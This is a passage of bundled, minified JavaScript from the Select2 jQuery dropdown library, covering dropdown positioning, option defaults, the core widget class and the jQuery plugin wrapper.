                  this.$results.on("scroll", this.loadMoreIfNeeded.bind(this));
              }),
              (t.prototype.loadMoreIfNeeded = function () {
                var t = e.contains(
                  document.documentElement,
                  this.$loadingMore[0]
                );
                !this.loading &&
                  t &&
                  this.$results.offset().top +
                    this.$results.outerHeight(!1) +
                    50 >=
                    this.$loadingMore.offset().top +
                      this.$loadingMore.outerHeight(!1) &&
                  this.loadMore();
              }),
              (t.prototype.loadMore = function () {
                this.loading = !0;
                var t = e.extend({}, { page: 1 }, this.lastParams);
                t.page++, this.trigger("query:append", t);
              }),
              (t.prototype.showLoadingMore = function (e, t) {
                return t.pagination && t.pagination.more;
              }),
              (t.prototype.createLoadingMore = function () {
                var t = e(
                    '<li class="select2-results__option select2-results__option--load-more"role="option" aria-disabled="true"></li>'
                  ),
                  n = this.options.get("translations").get("loadingMore");
                return t.html(n(this.lastParams)), t;
              }),
              t
            );
          }),
          t.define(
            "select2/dropdown/attachBody",
            ["jquery", "../utils"],
            function (e, t) {
              var n = function (t, n, r) {
                (this.$dropdownParent = e(
                  r.get("dropdownParent") || document.body
                )),
                  t.call(this, n, r);
              };
              return (
                (n.prototype.bind = function (e, t, n) {
                  var r = this;
                  e.call(this, t, n),
                    t.on("open", function () {
                      r._showDropdown(),
                        r._attachPositioningHandler(t),
                        r._bindContainerResultHandlers(t);
                    }),
                    t.on("close", function () {
                      r._hideDropdown(), r._detachPositioningHandler(t);
                    }),
                    this.$dropdownContainer.on("mousedown", function (e) {
                      e.stopPropagation();
                    });
                }),
                (n.prototype.destroy = function (e) {
                  e.call(this), this.$dropdownContainer.remove();
                }),
                (n.prototype.position = function (e, t, n) {
                  t.attr("class", n.attr("class")),
                    t[0].classList.remove("select2"),
                    t[0].classList.add("select2-container--open"),
                    t.css({ position: "absolute", top: -999999 }),
                    (this.$container = n);
                }),
                (n.prototype.render = function (t) {
                  var n = e("<span></span>"),
                    r = t.call(this);
                  return n.append(r), (this.$dropdownContainer = n), n;
                }),
                (n.prototype._hideDropdown = function (e) {
                  this.$dropdownContainer.detach();
                }),
                (n.prototype._bindContainerResultHandlers = function (e, t) {
                  if (!this._containerResultsHandlersBound) {
                    var n = this;
                    t.on("results:all", function () {
                      n._positionDropdown(), n._resizeDropdown();
                    }),
                      t.on("results:append", function () {
                        n._positionDropdown(), n._resizeDropdown();
                      }),
                      t.on("results:message", function () {
                        n._positionDropdown(), n._resizeDropdown();
                      }),
                      t.on("select", function () {
                        n._positionDropdown(), n._resizeDropdown();
                      }),
                      t.on("unselect", function () {
                        n._positionDropdown(), n._resizeDropdown();
                      }),
                      (this._containerResultsHandlersBound = !0);
                  }
                }),
                (n.prototype._attachPositioningHandler = function (n, r) {
                  var i = this,
                    o = "scroll.select2." + r.id,
                    s = "resize.select2." + r.id,
                    a = "orientationchange.select2." + r.id,
                    l = this.$container.parents().filter(t.hasScroll);
                  l.each(function () {
                    t.StoreData(this, "select2-scroll-position", {
                      x: e(this).scrollLeft(),
                      y: e(this).scrollTop(),
                    });
                  }),
                    l.on(o, function (n) {
                      var r = t.GetData(this, "select2-scroll-position");
                      e(this).scrollTop(r.y);
                    }),
                    e(window).on(o + " " + s + " " + a, function (e) {
                      i._positionDropdown(), i._resizeDropdown();
                    });
                }),
                (n.prototype._detachPositioningHandler = function (n, r) {
                  var i = "scroll.select2." + r.id,
                    o = "resize.select2." + r.id,
                    s = "orientationchange.select2." + r.id;
                  this.$container.parents().filter(t.hasScroll).off(i),
                    e(window).off(i + " " + o + " " + s);
                }),
                (n.prototype._positionDropdown = function () {
                  var t = e(window),
                    n = this.$dropdown[0].classList.contains(
                      "select2-dropdown--above"
                    ),
                    r = this.$dropdown[0].classList.contains(
                      "select2-dropdown--below"
                    ),
                    i = null,
                    o = this.$container.offset();
                  o.bottom = o.top + this.$container.outerHeight(!1);
                  var s = { height: this.$container.outerHeight(!1) };
                  (s.top = o.top), (s.bottom = o.top + s.height);
                  var a = this.$dropdown.outerHeight(!1),
                    l = t.scrollTop(),
                    c = t.scrollTop() + t.height(),
                    u = l < o.top - a,
                    d = c > o.bottom + a,
                    p = { left: o.left, top: s.bottom },
                    f = this.$dropdownParent;
                  "static" === f.css("position") && (f = f.offsetParent());
                  var h = { top: 0, left: 0 };
                  (e.contains(document.body, f[0]) || f[0].isConnected) &&
                    (h = f.offset()),
                    (p.top -= h.top),
                    (p.left -= h.left),
                    n || r || (i = "below"),
                    d || !u || n
                      ? !u && d && n && (i = "below")
                      : (i = "above"),
                    ("above" == i || (n && "below" !== i)) &&
                      (p.top = s.top - h.top - a),
                    null != i &&
                      (this.$dropdown[0].classList.remove(
                        "select2-dropdown--below"
                      ),
                      this.$dropdown[0].classList.remove(
                        "select2-dropdown--above"
                      ),
                      this.$dropdown[0].classList.add("select2-dropdown--" + i),
                      this.$container[0].classList.remove(
                        "select2-container--below"
                      ),
                      this.$container[0].classList.remove(
                        "select2-container--above"
                      ),
                      this.$container[0].classList.add(
                        "select2-container--" + i
                      )),
                    this.$dropdownContainer.css(p);
                }),
                (n.prototype._resizeDropdown = function () {
                  var e = { width: this.$container.outerWidth(!1) + "px" };
                  this.options.get("dropdownAutoWidth") &&
                    ((e.minWidth = e.width),
                    (e.position = "relative"),
                    (e.width = "auto")),
                    this.$dropdown.css(e);
                }),
                (n.prototype._showDropdown = function (e) {
                  this.$dropdownContainer.appendTo(this.$dropdownParent),
                    this._positionDropdown(),
                    this._resizeDropdown();
                }),
                n
              );
            }
          ),
          t.define("select2/dropdown/minimumResultsForSearch", [], function () {
            var e = function (e, t, n, r) {
              (this.minimumResultsForSearch = n.get("minimumResultsForSearch")),
                this.minimumResultsForSearch < 0 &&
                  (this.minimumResultsForSearch = 1 / 0),
                e.call(this, t, n, r);
            };
            function t(e) {
              for (var n = 0, r = 0; r < e.length; r++) {
                var i = e[r];
                i.children ? (n += t(i.children)) : n++;
              }
              return n;
            }
            return (
              (e.prototype.showSearch = function (e, n) {
                return (
                  !(t(n.data.results) < this.minimumResultsForSearch) &&
                  e.call(this, n)
                );
              }),
              e
            );
          }),
          t.define(
            "select2/dropdown/selectOnClose",
            ["../utils"],
            function (e) {
              var t = function () {};
              return (
                (t.prototype.bind = function (e, t, n) {
                  var r = this;
                  e.call(this, t, n),
                    t.on("close", function (e) {
                      r._handleSelectOnClose(e);
                    });
                }),
                (t.prototype._handleSelectOnClose = function (t, n) {
                  if (n && null != n.originalSelect2Event) {
                    var r = n.originalSelect2Event;
                    if ("select" === r._type || "unselect" === r._type) return;
                  }
                  var i = this.getHighlightedResults();
                  if (!(i.length < 1)) {
                    var o = e.GetData(i[0], "data");
                    (null != o.element && o.element.selected) ||
                      (null == o.element && o.selected) ||
                      this.trigger("select", { data: o });
                  }
                }),
                t
              );
            }
          ),
          t.define("select2/dropdown/closeOnSelect", [], function () {
            var e = function () {};
            return (
              (e.prototype.bind = function (e, t, n) {
                var r = this;
                e.call(this, t, n),
                  t.on("select", function (e) {
                    r._selectTriggered(e);
                  }),
                  t.on("unselect", function (e) {
                    r._selectTriggered(e);
                  });
              }),
              (e.prototype._selectTriggered = function (e, t) {
                var n = t.originalEvent;
                (n && (n.ctrlKey || n.metaKey)) ||
                  this.trigger("close", {
                    originalEvent: n,
                    originalSelect2Event: t,
                  });
              }),
              e
            );
          }),
          t.define("select2/dropdown/dropdownCss", ["../utils"], function (e) {
            var t = function () {};
            return (
              (t.prototype.render = function (t) {
                var n = t.call(this),
                  r = this.options.get("dropdownCssClass") || "";
                return (
                  -1 !== r.indexOf(":all:") &&
                    ((r = r.replace(":all:", "")),
                    e.copyNonInternalCssClasses(n[0], this.$element[0])),
                  n.addClass(r),
                  n
                );
              }),
              t
            );
          }),
          t.define(
            "select2/dropdown/tagsSearchHighlight",
            ["../utils"],
            function (e) {
              var t = function () {};
              return (
                (t.prototype.highlightFirstItem = function (t) {
                  var n = this.$results.find(
                    ".select2-results__option--selectable:not(.select2-results__option--selected)"
                  );
                  if (n.length > 0) {
                    var r = n.first(),
                      i = e.GetData(r[0], "data").element;
                    if (
                      i &&
                      i.getAttribute &&
                      "true" === i.getAttribute("data-select2-tag")
                    )
                      return void r.trigger("mouseenter");
                  }
                  t.call(this);
                }),
                t
              );
            }
          ),
          t.define("select2/i18n/en", [], function () {
            return {
              errorLoading: function () {
                return "The results could not be loaded.";
              },
              inputTooLong: function (e) {
                var t = e.input.length - e.maximum,
                  n = "Please delete " + t + " character";
                return 1 != t && (n += "s"), n;
              },
              inputTooShort: function (e) {
                return (
                  "Please enter " +
                  (e.minimum - e.input.length) +
                  " or more characters"
                );
              },
              loadingMore: function () {
                return "Loading more results…";
              },
              maximumSelected: function (e) {
                var t = "You can only select " + e.maximum + " item";
                return 1 != e.maximum && (t += "s"), t;
              },
              noResults: function () {
                return "No results found";
              },
              searching: function () {
                return "Searching…";
              },
              removeAllItems: function () {
                return "Remove all items";
              },
              removeItem: function () {
                return "Remove item";
              },
              search: function () {
                return "Search";
              },
            };
          }),
          t.define(
            "select2/defaults",
            [
              "jquery",
              "./results",
              "./selection/single",
              "./selection/multiple",
              "./selection/placeholder",
              "./selection/allowClear",
              "./selection/search",
              "./selection/selectionCss",
              "./selection/eventRelay",
              "./utils",
              "./translation",
              "./diacritics",
              "./data/select",
              "./data/array",
              "./data/ajax",
              "./data/tags",
              "./data/tokenizer",
              "./data/minimumInputLength",
              "./data/maximumInputLength",
              "./data/maximumSelectionLength",
              "./dropdown",
              "./dropdown/search",
              "./dropdown/hidePlaceholder",
              "./dropdown/infiniteScroll",
              "./dropdown/attachBody",
              "./dropdown/minimumResultsForSearch",
              "./dropdown/selectOnClose",
              "./dropdown/closeOnSelect",
              "./dropdown/dropdownCss",
              "./dropdown/tagsSearchHighlight",
              "./i18n/en",
            ],
            function (
              e,
              t,
              n,
              r,
              i,
              o,
              s,
              a,
              l,
              c,
              u,
              d,
              p,
              f,
              h,
              g,
              m,
              v,
              y,
              b,
              x,
              w,
              _,
              T,
              A,
              C,
              $,
              S,
              E,
              D,
              k
            ) {
              var L = function () {
                this.reset();
              };
              return (
                (L.prototype.apply = function (u) {
                  if (
                    (null ==
                      (u = e.extend(!0, {}, this.defaults, u)).dataAdapter &&
                      (null != u.ajax
                        ? (u.dataAdapter = h)
                        : null != u.data
                        ? (u.dataAdapter = f)
                        : (u.dataAdapter = p),
                      u.minimumInputLength > 0 &&
                        (u.dataAdapter = c.Decorate(u.dataAdapter, v)),
                      u.maximumInputLength > 0 &&
                        (u.dataAdapter = c.Decorate(u.dataAdapter, y)),
                      u.maximumSelectionLength > 0 &&
                        (u.dataAdapter = c.Decorate(u.dataAdapter, b)),
                      u.tags && (u.dataAdapter = c.Decorate(u.dataAdapter, g)),
                      (null == u.tokenSeparators && null == u.tokenizer) ||
                        (u.dataAdapter = c.Decorate(u.dataAdapter, m))),
                    null == u.resultsAdapter &&
                      ((u.resultsAdapter = t),
                      null != u.ajax &&
                        (u.resultsAdapter = c.Decorate(u.resultsAdapter, T)),
                      null != u.placeholder &&
                        (u.resultsAdapter = c.Decorate(u.resultsAdapter, _)),
                      u.selectOnClose &&
                        (u.resultsAdapter = c.Decorate(u.resultsAdapter, $)),
                      u.tags &&
                        (u.resultsAdapter = c.Decorate(u.resultsAdapter, D))),
                    null == u.dropdownAdapter)
                  ) {
                    if (u.multiple) u.dropdownAdapter = x;
                    else {
                      var d = c.Decorate(x, w);
                      u.dropdownAdapter = d;
                    }
                    0 !== u.minimumResultsForSearch &&
                      (u.dropdownAdapter = c.Decorate(u.dropdownAdapter, C)),
                      u.closeOnSelect &&
                        (u.dropdownAdapter = c.Decorate(u.dropdownAdapter, S)),
                      null != u.dropdownCssClass &&
                        (u.dropdownAdapter = c.Decorate(u.dropdownAdapter, E)),
                      (u.dropdownAdapter = c.Decorate(u.dropdownAdapter, A));
                  }
                  null == u.selectionAdapter &&
                    (u.multiple
                      ? (u.selectionAdapter = r)
                      : (u.selectionAdapter = n),
                    null != u.placeholder &&
                      (u.selectionAdapter = c.Decorate(u.selectionAdapter, i)),
                    u.allowClear &&
                      (u.selectionAdapter = c.Decorate(u.selectionAdapter, o)),
                    u.multiple &&
                      (u.selectionAdapter = c.Decorate(u.selectionAdapter, s)),
                    null != u.selectionCssClass &&
                      (u.selectionAdapter = c.Decorate(u.selectionAdapter, a)),
                    (u.selectionAdapter = c.Decorate(u.selectionAdapter, l))),
                    (u.language = this._resolveLanguage(u.language)),
                    u.language.push("en");
                  for (var k = [], L = 0; L < u.language.length; L++) {
                    var j = u.language[L];
                    -1 === k.indexOf(j) && k.push(j);
                  }
                  return (
                    (u.language = k),
                    (u.translations = this._processTranslations(
                      u.language,
                      u.debug
                    )),
                    u
                  );
                }),
                (L.prototype.reset = function () {
                  var t = function (e) {
                    return e.replace(/[^\u0000-\u007E]/g, function (e) {
                      return d[e] || e;
                    });
                  };
                  this.defaults = {
                    amdLanguageBase: "./i18n/",
                    autocomplete: "off",
                    closeOnSelect: !0,
                    debug: !1,
                    dropdownAutoWidth: !1,
                    escapeMarkup: c.escapeMarkup,
                    language: {},
                    matcher: function n(r, i) {
                      if (null == r.term || "" === r.term.trim()) return i;
                      if (i.children && i.children.length > 0) {
                        for (
                          var o = e.extend(!0, {}, i),
                            s = i.children.length - 1;
                          s >= 0;
                          s--
                        )
                          null == n(r, i.children[s]) &&
                            o.children.splice(s, 1);
                        return o.children.length > 0 ? o : n(r, o);
                      }
                      var a = t(i.text).toUpperCase(),
                        l = t(r.term).toUpperCase();
                      return a.indexOf(l) > -1 ? i : null;
                    },
                    minimumInputLength: 0,
                    maximumInputLength: 0,
                    maximumSelectionLength: 0,
                    minimumResultsForSearch: 0,
                    selectOnClose: !1,
                    scrollAfterSelect: !1,
                    sorter: function (e) {
                      return e;
                    },
                    templateResult: function (e) {
                      return e.text;
                    },
                    templateSelection: function (e) {
                      return e.text;
                    },
                    theme: "default",
                    width: "resolve",
                  };
                }),
                (L.prototype.applyFromElement = function (e, t) {
                  var n = e.language,
                    r = this.defaults.language,
                    i = t.prop("lang"),
                    o = t.closest("[lang]").prop("lang"),
                    s = Array.prototype.concat.call(
                      this._resolveLanguage(i),
                      this._resolveLanguage(n),
                      this._resolveLanguage(r),
                      this._resolveLanguage(o)
                    );
                  return (e.language = s), e;
                }),
                (L.prototype._resolveLanguage = function (t) {
                  if (!t) return [];
                  if (e.isEmptyObject(t)) return [];
                  if (e.isPlainObject(t)) return [t];
                  var n;
                  n = Array.isArray(t) ? t : [t];
                  for (var r = [], i = 0; i < n.length; i++)
                    if (
                      (r.push(n[i]),
                      "string" == typeof n[i] && n[i].indexOf("-") > 0)
                    ) {
                      var o = n[i].split("-")[0];
                      r.push(o);
                    }
                  return r;
                }),
                (L.prototype._processTranslations = function (t, n) {
                  for (var r = new u(), i = 0; i < t.length; i++) {
                    var o = new u(),
                      s = t[i];
                    if ("string" == typeof s)
                      try {
                        o = u.loadPath(s);
                      } catch (e) {
                        try {
                          (s = this.defaults.amdLanguageBase + s),
                            (o = u.loadPath(s));
                        } catch (e) {
                          n &&
                            window.console &&
                            console.warn &&
                            console.warn(
                              'Select2: The language file for "' +
                                s +
                                '" could not be automatically loaded. A fallback will be used instead.'
                            );
                        }
                      }
                    else o = e.isPlainObject(s) ? new u(s) : s;
                    r.extend(o);
                  }
                  return r;
                }),
                (L.prototype.set = function (t, n) {
                  var r = {};
                  r[e.camelCase(t)] = n;
                  var i = c._convertData(r);
                  e.extend(!0, this.defaults, i);
                }),
                new L()
              );
            }
          ),
          t.define(
            "select2/options",
            ["jquery", "./defaults", "./utils"],
            function (e, t, n) {
              var r = function (e, n) {
                (this.options = e),
                  null != n && this.fromElement(n),
                  null != n &&
                    (this.options = t.applyFromElement(this.options, n)),
                  (this.options = t.apply(this.options));
              };
              return (
                (r.prototype.fromElement = function (t) {
                  var r = function (e, t) {
                      return t.toUpperCase();
                    },
                    i = ["select2"];
                  null == this.options.multiple &&
                    (this.options.multiple = t.prop("multiple")),
                    null == this.options.disabled &&
                      (this.options.disabled = t.prop("disabled")),
                    null == this.options.autocomplete &&
                      t.prop("autocomplete") &&
                      (this.options.autocomplete = t.prop("autocomplete")),
                    null == this.options.dir &&
                      (t.prop("dir")
                        ? (this.options.dir = t.prop("dir"))
                        : t.closest("[dir]").prop("dir")
                        ? (this.options.dir = t.closest("[dir]").prop("dir"))
                        : (this.options.dir = "ltr")),
                    t.prop("disabled", this.options.disabled),
                    t.prop("multiple", this.options.multiple),
                    n.GetData(t[0], "select2Tags") &&
                      (this.options.debug &&
                        window.console &&
                        console.warn &&
                        console.warn(
                          'Select2: The `data-select2-tags` attribute has been changed to use the `data-data` and `data-tags="true"` attributes and will be removed in future versions of Select2.'
                        ),
                      n.StoreData(t[0], "data", n.GetData(t[0], "select2Tags")),
                      n.StoreData(t[0], "tags", !0)),
                    n.GetData(t[0], "ajaxUrl") &&
                      (this.options.debug &&
                        window.console &&
                        console.warn &&
                        console.warn(
                          "Select2: The `data-ajax-url` attribute has been changed to `data-ajax--url` and support for the old attribute will be removed in future versions of Select2."
                        ),
                      t.attr("ajax--url", n.GetData(t[0], "ajaxUrl")),
                      n.StoreData(
                        t[0],
                        "ajax-Url",
                        n.GetData(t[0], "ajaxUrl")
                      ));
                  for (var o = {}, s = 0; s < t[0].attributes.length; s++) {
                    var a = t[0].attributes[s].name;
                    if ("data-" == a.substr(0, 5)) {
                      var c = a.substring(5),
                        u = n.GetData(t[0], c);
                      o[c.replace(/-([a-z])/g, r)] = u;
                    }
                  }
                  e.fn.jquery &&
                    "1." == e.fn.jquery.substr(0, 2) &&
                    t[0].dataset &&
                    (o = e.extend(!0, {}, t[0].dataset, o));
                  var d = e.extend(!0, {}, n.GetData(t[0]), o);
                  for (var p in (d = n._convertData(d)))
                    i.indexOf(p) > -1 ||
                      (e.isPlainObject(this.options[p])
                        ? e.extend(this.options[p], d[p])
                        : (this.options[p] = d[p]));
                  return this;
                }),
                (r.prototype.get = function (e) {
                  return this.options[e];
                }),
                (r.prototype.set = function (e, t) {
                  this.options[e] = t;
                }),
                r
              );
            }
          ),
          t.define(
            "select2/core",
            ["jquery", "./options", "./utils", "./keys"],
            function (e, t, n, r) {
              var i = function (e, r) {
                null != n.GetData(e[0], "select2") &&
                  n.GetData(e[0], "select2").destroy(),
                  (this.$element = e),
                  (this.id = this._generateId(e)),
                  (r = r || {}),
                  (this.options = new t(r, e)),
                  i.__super__.constructor.call(this);
                var o = e.attr("tabindex") || 0;
                n.StoreData(e[0], "old-tabindex", o), e.attr("tabindex", "-1");
                var s = this.options.get("dataAdapter");
                this.dataAdapter = new s(e, this.options);
                var a = this.render();
                this._placeContainer(a);
                var l = this.options.get("selectionAdapter");
                (this.selection = new l(e, this.options)),
                  (this.$selection = this.selection.render()),
                  this.selection.position(this.$selection, a);
                var c = this.options.get("dropdownAdapter");
                (this.dropdown = new c(e, this.options)),
                  (this.$dropdown = this.dropdown.render()),
                  this.dropdown.position(this.$dropdown, a);
                var u = this.options.get("resultsAdapter");
                (this.results = new u(e, this.options, this.dataAdapter)),
                  (this.$results = this.results.render()),
                  this.results.position(this.$results, this.$dropdown);
                var d = this;
                this._bindAdapters(),
                  this._registerDomEvents(),
                  this._registerDataEvents(),
                  this._registerSelectionEvents(),
                  this._registerDropdownEvents(),
                  this._registerResultsEvents(),
                  this._registerEvents(),
                  this.dataAdapter.current(function (e) {
                    d.trigger("selection:update", { data: e });
                  }),
                  e[0].classList.add("select2-hidden-accessible"),
                  e.attr("aria-hidden", "true"),
                  this._syncAttributes(),
                  n.StoreData(e[0], "select2", this),
                  e.data("select2", this);
              };
              return (
                n.Extend(i, n.Observable),
                (i.prototype._generateId = function (e) {
                  return (
                    "select2-" +
                    (null != e.attr("id")
                      ? e.attr("id")
                      : null != e.attr("name")
                      ? e.attr("name") + "-" + n.generateChars(2)
                      : n.generateChars(4)
                    ).replace(/(:|\.|\[|\]|,)/g, "")
                  );
                }),
                (i.prototype._placeContainer = function (e) {
                  e.insertAfter(this.$element);
                  var t = this._resolveWidth(
                    this.$element,
                    this.options.get("width")
                  );
                  null != t && e.css("width", t);
                }),
                (i.prototype._resolveWidth = function (e, t) {
                  var n =
                    /^width:(([-+]?([0-9]*\.)?[0-9]+)(px|em|ex|%|in|cm|mm|pt|pc))/i;
                  if ("resolve" == t) {
                    var r = this._resolveWidth(e, "style");
                    return null != r ? r : this._resolveWidth(e, "element");
                  }
                  if ("element" == t) {
                    var i = e.outerWidth(!1);
                    return i <= 0 ? "auto" : i + "px";
                  }
                  if ("style" == t) {
                    var o = e.attr("style");
                    if ("string" != typeof o) return null;
                    for (
                      var s = o.split(";"), a = 0, l = s.length;
                      a < l;
                      a += 1
                    ) {
                      var c = s[a].replace(/\s/g, "").match(n);
                      if (null !== c && c.length >= 1) return c[1];
                    }
                    return null;
                  }
                  return "computedstyle" == t
                    ? window.getComputedStyle(e[0]).width
                    : t;
                }),
                (i.prototype._bindAdapters = function () {
                  this.dataAdapter.bind(this, this.$container),
                    this.selection.bind(this, this.$container),
                    this.dropdown.bind(this, this.$container),
                    this.results.bind(this, this.$container);
                }),
                (i.prototype._registerDomEvents = function () {
                  var e = this;
                  this.$element.on("change.select2", function () {
                    e.dataAdapter.current(function (t) {
                      e.trigger("selection:update", { data: t });
                    });
                  }),
                    this.$element.on("focus.select2", function (t) {
                      e.trigger("focus", t);
                    }),
                    (this._syncA = n.bind(this._syncAttributes, this)),
                    (this._syncS = n.bind(this._syncSubtree, this)),
                    (this._observer = new window.MutationObserver(function (t) {
                      e._syncA(), e._syncS(t);
                    })),
                    this._observer.observe(this.$element[0], {
                      attributes: !0,
                      childList: !0,
                      subtree: !1,
                    });
                }),
                (i.prototype._registerDataEvents = function () {
                  var e = this;
                  this.dataAdapter.on("*", function (t, n) {
                    e.trigger(t, n);
                  });
                }),
                (i.prototype._registerSelectionEvents = function () {
                  var e = this,
                    t = ["toggle", "focus"];
                  this.selection.on("toggle", function () {
                    e.toggleDropdown();
                  }),
                    this.selection.on("focus", function (t) {
                      e.focus(t);
                    }),
                    this.selection.on("*", function (n, r) {
                      -1 === t.indexOf(n) && e.trigger(n, r);
                    });
                }),
                (i.prototype._registerDropdownEvents = function () {
                  var e = this;
                  this.dropdown.on("*", function (t, n) {
                    e.trigger(t, n);
                  });
                }),
                (i.prototype._registerResultsEvents = function () {
                  var e = this;
                  this.results.on("*", function (t, n) {
                    e.trigger(t, n);
                  });
                }),
                (i.prototype._registerEvents = function () {
                  var e = this;
                  this.on("open", function () {
                    e.$container[0].classList.add("select2-container--open");
                  }),
                    this.on("close", function () {
                      e.$container[0].classList.remove(
                        "select2-container--open"
                      );
                    }),
                    this.on("enable", function () {
                      e.$container[0].classList.remove(
                        "select2-container--disabled"
                      );
                    }),
                    this.on("disable", function () {
                      e.$container[0].classList.add(
                        "select2-container--disabled"
                      );
                    }),
                    this.on("blur", function () {
                      e.$container[0].classList.remove(
                        "select2-container--focus"
                      );
                    }),
                    this.on("query", function (t) {
                      e.isOpen() || e.trigger("open", {}),
                        this.dataAdapter.query(t, function (n) {
                          e.trigger("results:all", { data: n, query: t });
                        });
                    }),
                    this.on("query:append", function (t) {
                      this.dataAdapter.query(t, function (n) {
                        e.trigger("results:append", { data: n, query: t });
                      });
                    }),
                    this.on("keypress", function (t) {
                      var n = t.which;
                      e.isOpen()
                        ? n === r.ESC || (n === r.UP && t.altKey)
                          ? (e.close(t), t.preventDefault())
                          : n === r.ENTER || n === r.TAB
                          ? (e.trigger("results:select", {}),
                            t.preventDefault())
                          : n === r.SPACE && t.ctrlKey
                          ? (e.trigger("results:toggle", {}),
                            t.preventDefault())
                          : n === r.UP
                          ? (e.trigger("results:previous", {}),
                            t.preventDefault())
                          : n === r.DOWN &&
                            (e.trigger("results:next", {}), t.preventDefault())
                        : (n === r.ENTER ||
                            n === r.SPACE ||
                            (n === r.DOWN && t.altKey)) &&
                          (e.open(), t.preventDefault());
                    });
                }),
                (i.prototype._syncAttributes = function () {
                  this.options.set("disabled", this.$element.prop("disabled")),
                    this.isDisabled()
                      ? (this.isOpen() && this.close(),
                        this.trigger("disable", {}))
                      : this.trigger("enable", {});
                }),
                (i.prototype._isChangeMutation = function (e) {
                  var t = this;
                  if (e.addedNodes && e.addedNodes.length > 0) {
                    for (var n = 0; n < e.addedNodes.length; n++)
                      if (e.addedNodes[n].selected) return !0;
                  } else {
                    if (e.removedNodes && e.removedNodes.length > 0) return !0;
                    if (Array.isArray(e))
                      return e.some(function (e) {
                        return t._isChangeMutation(e);
                      });
                  }
                  return !1;
                }),
                (i.prototype._syncSubtree = function (e) {
                  var t = this._isChangeMutation(e),
                    n = this;
                  t &&
                    this.dataAdapter.current(function (e) {
                      n.trigger("selection:update", { data: e });
                    });
                }),
                (i.prototype.trigger = function (e, t) {
                  var n = i.__super__.trigger,
                    r = {
                      open: "opening",
                      close: "closing",
                      select: "selecting",
                      unselect: "unselecting",
                      clear: "clearing",
                    };
                  if ((void 0 === t && (t = {}), e in r)) {
                    var o = r[e],
                      s = { prevented: !1, name: e, args: t };
                    if ((n.call(this, o, s), s.prevented))
                      return void (t.prevented = !0);
                  }
                  n.call(this, e, t);
                }),
                (i.prototype.toggleDropdown = function () {
                  this.isDisabled() ||
                    (this.isOpen() ? this.close() : this.open());
                }),
                (i.prototype.open = function () {
                  this.isOpen() ||
                    this.isDisabled() ||
                    this.trigger("query", {});
                }),
                (i.prototype.close = function (e) {
                  this.isOpen() && this.trigger("close", { originalEvent: e });
                }),
                (i.prototype.isEnabled = function () {
                  return !this.isDisabled();
                }),
                (i.prototype.isDisabled = function () {
                  return this.options.get("disabled");
                }),
                (i.prototype.isOpen = function () {
                  return this.$container[0].classList.contains(
                    "select2-container--open"
                  );
                }),
                (i.prototype.hasFocus = function () {
                  return this.$container[0].classList.contains(
                    "select2-container--focus"
                  );
                }),
                (i.prototype.focus = function (e) {
                  this.hasFocus() ||
                    (this.$container[0].classList.add(
                      "select2-container--focus"
                    ),
                    this.trigger("focus", {}));
                }),
                (i.prototype.enable = function (e) {
                  this.options.get("debug") &&
                    window.console &&
                    console.warn &&
                    console.warn(
                      'Select2: The `select2("enable")` method has been deprecated and will be removed in later Select2 versions. Use $element.prop("disabled") instead.'
                    ),
                    (null != e && 0 !== e.length) || (e = [!0]);
                  var t = !e[0];
                  this.$element.prop("disabled", t);
                }),
                (i.prototype.data = function () {
                  this.options.get("debug") &&
                    arguments.length > 0 &&
                    window.console &&
                    console.warn &&
                    console.warn(
                      'Select2: Data can no longer be set using `select2("data")`. You should consider setting the value instead using `$element.val()`.'
                    );
                  var e = [];
                  return (
                    this.dataAdapter.current(function (t) {
                      e = t;
                    }),
                    e
                  );
                }),
                (i.prototype.val = function (e) {
                  if (
                    (this.options.get("debug") &&
                      window.console &&
                      console.warn &&
                      console.warn(
                        'Select2: The `select2("val")` method has been deprecated and will be removed in later Select2 versions. Use $element.val() instead.'
                      ),
                    null == e || 0 === e.length)
                  )
                    return this.$element.val();
                  var t = e[0];
                  Array.isArray(t) &&
                    (t = t.map(function (e) {
                      return e.toString();
                    })),
                    this.$element.val(t).trigger("input").trigger("change");
                }),
                (i.prototype.destroy = function () {
                  n.RemoveData(this.$container[0]),
                    this.$container.remove(),
                    this._observer.disconnect(),
                    (this._observer = null),
                    (this._syncA = null),
                    (this._syncS = null),
                    this.$element.off(".select2"),
                    this.$element.attr(
                      "tabindex",
                      n.GetData(this.$element[0], "old-tabindex")
                    ),
                    this.$element[0].classList.remove(
                      "select2-hidden-accessible"
                    ),
                    this.$element.attr("aria-hidden", "false"),
                    n.RemoveData(this.$element[0]),
                    this.$element.removeData("select2"),
                    this.dataAdapter.destroy(),
                    this.selection.destroy(),
                    this.dropdown.destroy(),
                    this.results.destroy(),
                    (this.dataAdapter = null),
                    (this.selection = null),
                    (this.dropdown = null),
                    (this.results = null);
                }),
                (i.prototype.render = function () {
                  var t = e(
                    '<span class="select2 select2-container"><span class="selection"></span><span class="dropdown-wrapper" aria-hidden="true"></span></span>'
                  );
                  return (
                    t.attr("dir", this.options.get("dir")),
                    (this.$container = t),
                    this.$container[0].classList.add(
                      "select2-container--" + this.options.get("theme")
                    ),
                    n.StoreData(t[0], "element", this.$element),
                    t
                  );
                }),
                i
              );
            }
          ),
          t.define("jquery-mousewheel", ["jquery"], function (e) {
            return e;
          }),
          t.define(
            "jquery.select2",
            [
              "jquery",
              "jquery-mousewheel",
              "./select2/core",
              "./select2/defaults",
              "./select2/utils",
            ],
            function (e, t, n, r, i) {
              if (null == e.fn.select2) {
                var o = ["open", "close", "destroy"];
                e.fn.select2 = function (t) {
                  if ("object" == typeof (t = t || {}))
                    return (
                      this.each(function () {
                        var r = e.extend(!0, {}, t);
                        new n(e(this), r);
                      }),
                      this
                    );
                  if ("string" == typeof t) {
                    var r,
                      s = Array.prototype.slice.call(arguments, 1);
                    return (
                      this.each(function () {
                        var e = i.GetData(this, "select2");
                        null == e &&
                          window.console &&
                          console.error &&
                          console.error(
                            "The select2('" +
                              t +
                              "') method was called on an element that is not using Select2."
                          ),
                          (r = e[t].apply(e, s));
                      }),
                      o.indexOf(t) > -1 ? this : r
                    );
                  }
                  throw new Error("Invalid arguments for Select2: " + t);
                };
              }
              return (
                null == e.fn.select2.defaults && (e.fn.select2.defaults = r), n
              );
            }
          ),
          { define: t.define, require: t.require }
        );
      })(),
      n = t.require("jquery.select2");
    return (e.fn.select2.amd = t), n;
  }),
    "function" == typeof define && define.amd
      ? define(["jquery"], o)
      : a
      ? (a = function (e, t) {
          return (
            void 0 === t &&
              (t = "undefined" != typeof window ? i("2B2k2") : i("2B2k2")(e)),
            o(t),
            t
          );
        })
      : o(jQuery),
    (window.$ = window.jQuery = s),
